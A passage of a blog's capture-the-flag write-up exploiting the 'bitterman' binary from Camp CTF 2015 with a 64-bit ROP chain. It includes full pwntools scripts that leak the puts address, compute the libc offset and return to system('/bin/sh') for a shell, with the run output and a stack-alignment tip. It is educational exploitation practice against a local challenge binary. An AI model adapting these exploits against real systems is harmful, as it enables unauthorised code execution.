+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span>  <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;name?&#34;</span><span class="p">)</span> <span class="c1"># recieve data until we recieve the string</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;robin&#34;</span><span class="p">)</span>  <span class="c1"># send data </span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;message:&#34;</span><span class="p">)</span> <span class="c1"># recieve data until we recieve the string</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1024&#34;</span><span class="p">)</span> <span class="c1"># send data </span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;text:&#34;</span><span class="p">)</span> <span class="c1"># recieve data until we recieve the string</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># send data</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Thanks!&#34;</span><span class="p">)</span> <span class="c1"># recieve data until we recieve the string</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># recieving the string until we get leaked address and padding with null bytes to length of 8</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Leaked puts: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span> <span class="c1"># Prints the leaked addresss</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># keeps the shell interactive</span>
+</span></span></code></pre></div><p>This script pretty much explains everything with comments. So, let&rsquo;s see what we get after running this:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">bitterman</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">3117</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">ROP-Emporium</span><span class="err">/</span><span class="no">libc.so.6</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Leaked</span> <span class="no">puts</span><span class="p">:</span> <span class="err">��</span><span class="no">E</span><span class="err">\</span><span class="no">x92</span><span class="err">\</span><span class="no">x87</span><span class="err">\</span><span class="no">x7f</span><span class="err">\</span><span class="no">x00</span><span class="err">\</span><span class="no">x00</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span></code></pre></div><p>Great, we now have the leaked address, we need to find the offset which will be constant for every address. So, let&rsquo;s start carfting our <strong>ret2libc</strong> attack.</p>
+<h1 id="stage-2-final-exploit-using-ret2libc" class="relative group">Stage 2: Final Exploit using ret2libc <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#stage-2-final-exploit-using-ret2libc" aria-label="Anchor">#</a></span></h1><p>So, from the previous exploit we get the leaked address. Now we need to find the offset and execute the <code>/bin/sh</code> to spawn a shell.</p>
+<p>First off, we need <code>main</code> address because the leak address will be changed everytime so we need to get main address so we can use the leaked address to get the offset for current process.
+Using <code>objdump -D bitterman | grep main</code>, we will grab the address of the bitteman&rsquo;s <code>main</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">-</span><span class="nf">snip--</span>
+</span></span><span class="line"><span class="cl"><span class="err">00000000004006</span><span class="nf">ec</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="err">--</span><span class="nf">snip--</span>
+</span></span></code></pre></div><p>Nice, we have the main address. Let&rsquo;s proceed further for crafting the exploit.</p>
+<blockquote>
+<p>Warning: Before we proceeds, we need the <code>libc.so.6</code> of your machine. Copy it with <code>cp //lib/x86_64-linux-gnu/libc.so.6 .</code> , it willcopy the<code>libc.so.6</code> to the working directory.</p>
+</blockquote>
+<p>Now, we will automate the finding of addresses of <code>put</code> and <code>system</code>  with pwntools but beforehand we need <code>/bin/sh</code> address as well. To find that, let&rsquo;s use strings <code>strings -a -t x libc.so.6 | grep /bin/sh</code> , we will get the address of <code>/bin/sh</code> from the <code>libc.so.6</code>.</p>
+<p>Let&rsquo;s make the exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nf">from</span> <span class="no">pwn</span> <span class="no">import</span> <span class="p">*</span> <span class="c1"># importing fuctions 
+</span></span></span><span class="line"><span class="cl"><span class="c1">#context(terminal=[&#39;gnome-terminal&#39;,&#39;new-window&#39;]) Debug purpose
+</span></span></span><span class="line"><span class="cl"><span class="c1">#context.log_level = &#39;DEBUG&#39; # Debug purpose
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">p</span> <span class="err">=</span> <span class="no">process</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">bitterman</span><span class="err">&#39;</span><span class="p">)</span> <span class="c1"># using bitterman elf # processing the target elf
+</span></span></span><span class="line"><span class="cl"><span class="c1">#p = gdb.debug(&#39;./bitterman&#39;,&#39;b main&#39;) # breakpoint setup at main via gdb
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">libc</span> <span class="err">=</span> <span class="no">ELF</span><span class="p">(</span><span class="err">&#39;</span><span class="no">libc.so.6</span><span class="err">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">plt_put</span> <span class="err">=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x400520</span><span class="p">)</span> <span class="c1"># PLT put address 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">got_put</span> <span class="err">=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x600c50</span><span class="p">)</span> <span class="c1"># GOT put address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">pop_rdi</span> <span class="err">=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x400853</span><span class="p">)</span> <span class="c1"># pop_rdi address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">plt_main</span> <span class="err">=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x4006ec</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">padding</span> <span class="err">=</span> <span class="err">&#34;</span><span class="no">A</span><span class="err">&#34;</span><span class="p">*</span><span class="mi">152</span> <span class="c1"># Because we know the offset from earlier
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">=</span> <span class="no">padding</span> <span class="err">+</span>  <span class="no">pop_rdi</span> <span class="err">+</span> <span class="no">got_put</span> <span class="err">+</span> <span class="no">plt_put</span> <span class="err">+</span> <span class="no">plt_main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">p.recvuntil</span><span class="p">(</span><span class="err">&#34;</span><span class="no">name</span><span class="err">?&#34;</span><span class="p">)</span> <span class="c1"># recieve data until we recieve the string
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">p.sendline</span><span class="p">(</span><span class="err">&#34;</span><span class="no">robin</span><span class="err">&#34;</span><span class="p">)</span>  <span class="c1"># send data 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">p.recvuntil</span><span class="p">(</span><span class="err">&#34;</span><span class="no">message</span><span class="p">:</span><span class="err">&#34;</span><span class="p">)</span> <span class="c1"># recieve data until we recieve the string
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">p.sendline</span><span class="p">(</span><span class="err">&#34;</span><span class="mi">1024</span><span class="err">&#34;</span><span class="p">)</span> <span class="c1"># send data 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">p.recvuntil</span><span class="p">(</span><span class="err">&#34;</span><span class="no">text</span><span class="p">:</span><span class="err">&#34;</span><span class="p">)</span> <span class="c1"># recieve data until we recieve the string
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">p.sendline</span><span class="p">(</span><span class="no">payload</span><span class="p">)</span> <span class="c1"># send data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">p.recvuntil</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Thanks</span><span class="p">!</span><span class="err">&#34;</span><span class="p">)</span> <span class="c1"># recieve data until we recieve the string
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">leaked_puts</span> <span class="err">=</span> <span class="no">p.recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">].</span><span class="no">strip</span><span class="p">().</span><span class="no">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="err">&#34;\</span><span class="no">x00</span><span class="err">&#34;</span><span class="p">)</span> <span class="c1"># recieving the string until we get leaked address and padding with null bytes to length of 8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">log.success</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Leaked</span> <span class="no">puts</span><span class="p">:</span> <span class="nv">%s</span><span class="err">&#34;</span> <span class="err">%</span><span class="p">(</span><span class="no">leaked_puts</span><span class="p">))</span> <span class="c1"># Prints the leaked addresss
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">leaked_puts</span> <span class="err">=</span> <span class="no">u64</span><span class="p">(</span><span class="no">leaked_puts</span><span class="p">)</span> <span class="c1"># converts to 64-bit friendly integer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">offset</span> <span class="err">=</span> <span class="no">leaked_puts</span> <span class="p">-</span> <span class="no">libc.symbols</span><span class="p">[</span><span class="err">&#39;</span><span class="no">puts</span><span class="err">&#39;</span><span class="p">]</span> <span class="c1"># Ths
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">sys</span> <span class="err">=</span> <span class="no">p64</span><span class="p">(</span><span class="no">offset</span> <span class="err">+</span> <span class="no">libc.symbols</span><span class="p">[</span><span class="err">&#39;</span><span class="no">system</span><span class="err">&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nf">sh</span> <span class="err">=</span> <span class="no">p64</span><span class="p">(</span><span class="no">offset</span> <span class="err">+</span> <span class="mi">0x1b3e9a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">=</span> <span class="no">padding</span><span class="err">+</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x0000000000400509</span><span class="p">)</span> <span class="err">+</span> <span class="no">pop_rdi</span> <span class="err">+</span> <span class="no">sh</span> <span class="err">+</span> <span class="no">sys</span> <span class="c1"># remove p64(0x0000000000400509) if you&#39;re not using ubuntu
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">p.sendline</span><span class="p">(</span><span class="err">&#34;</span><span class="no">robin</span><span class="err">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">p.recvuntil</span><span class="p">(</span><span class="err">&#34;</span><span class="no">message</span><span class="p">:</span><span class="err">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">p.sendline</span><span class="p">(</span><span class="err">&#34;</span><span class="mi">1024</span><span class="err">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">p.recvuntil</span><span class="p">(</span><span class="err">&#34;</span><span class="no">text</span><span class="p">:</span><span class="err">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">p.sendline</span><span class="p">(</span><span class="no">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">p.recvuntil</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Thanks</span><span class="p">!</span><span class="err">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">p.interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p><strong>This will spawn a shell and hence you learned how to do a ret2libc attack</strong>.
+In a nutshell, we used the leak address to find the offset and hence using the gadget we overwrite the instruction pointer while calling the <code>system</code> and <code>/bin/sh</code> hence spawning a shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">ROP$</span> <span class="no">python</span> <span class="no">exploit2.py</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">bitterman</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">12562</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">ROP-Emporium</span><span class="err">/</span><span class="no">libc.so.6</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Leaked</span> <span class="no">puts</span><span class="p">:</span> <span class="err">��</span><span class="mi">3</span><span class="err">\</span><span class="no">x84</span><span class="err">�\</span><span class="no">x00</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">id</span>
+</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">robin</span><span class="p">)</span>
+</span></span></code></pre></div><h1 id="final-words" class="relative group">Final Words <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#final-words" aria-label="Anchor">#</a></span></h1><p>Thanks to <a href="https://twitter.com/__lord_idiot" target="_blank" rel="noreferrer">@Lord_Idiot</a> for helping me out with the stack alignment issue.</p>
+<h5 id="the-movaps-issue" class="relative group">The MOVAPS issue <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-movaps-issue" aria-label="Anchor">#</a></span></h5><hr>
+<p>If you&rsquo;re using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned before returning to GLIBC functions such as printf() and system(). The version of GLIBC packaged with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. The 64 bit calling convention requires the stack to be 16 byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.</p>
+<hr>
+<p>That was it. Until then, <strong>pwn</strong>.</p>
+<h5 id="files" class="relative group">Files <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#files" aria-label="Anchor">#</a></span></h5><p>Bitterman: <a href="https://github.com/ctfs/write-ups-2015/raw/master/camp-ctf-2015/pwn/bitterman-300/bitterman" target="_blank" rel="noreferrer">https://github.com/ctfs/write-ups-2015/raw/master/camp-ctf-2015/pwn/bitterman-300/bitterman</a></p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/rop-tools-usage/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >ROP- Basic Exploit Creation</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-07-26 00:00:00 &#43;0000 UTC">26 July 2019</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/dpwwn/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Vulnhub - dpwnn1</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-08-01 00:00:00 &#43;0000 UTC">1 August 2019</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
